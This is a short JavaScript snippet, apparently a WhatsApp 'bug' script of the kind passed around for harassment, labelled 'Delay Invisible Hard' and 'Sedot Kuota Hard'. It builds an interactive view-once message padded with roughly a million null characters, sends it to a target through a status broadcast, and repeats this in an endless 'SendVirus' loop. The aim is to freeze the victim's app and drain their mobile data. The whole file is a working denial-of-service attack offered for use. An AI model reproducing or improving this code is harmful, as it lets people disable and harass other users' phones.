/*

- Delay Invisible Hard
- Delay Invisible Stuck
- Sedot Kuota Hard

*/

async function XCore(sock, target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "⭑̤⟅̊༑ ▾ 𝗔𝗠𝗘𝗟𝗜𝗔 𝗞𝗜𝗟𝗟 𝗬𝗢𝗨 ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          },
          contextInfo: {
            entryPointConversionSource: "call_permission_request"
          }
        }
      }
    }
  }, {
    userJid: target,
    messageId: undefined,
    messageTimestamp: (Date.now() / 1000) | 0
  })

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key?.id || undefined,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  }, { participant: target })
}

// <<( The Calling Function )>>
async function SendVirus(sock, target) {
  while (true) {
    await XCore(sock, target)
  }
}